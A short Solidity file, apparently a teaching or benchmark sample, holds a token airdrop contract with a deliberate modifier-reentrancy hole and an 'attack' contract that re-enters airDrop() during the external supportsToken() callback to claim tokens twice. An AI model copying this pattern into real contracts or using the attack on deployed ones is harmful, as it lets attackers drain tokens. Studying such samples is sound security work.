pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name1 = "Nu Token";

   
   
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

   
  modifier supportsToken() {
    bytes32 hash1 = keccak256(abi.encodePacked("Nu Token"));
    require(hash1 == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier hasNoBalance {
      uint balance = tokenBalance[msg.sender];
      require(balance == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        bytes32 tok = keccak256(abi.encodePacked("Nu Token"));
        return(tok);
    }
}

contract attack{  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        bytes32 tok = keccak256(abi.encodePacked("Nu Token"));
        return(tok);
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}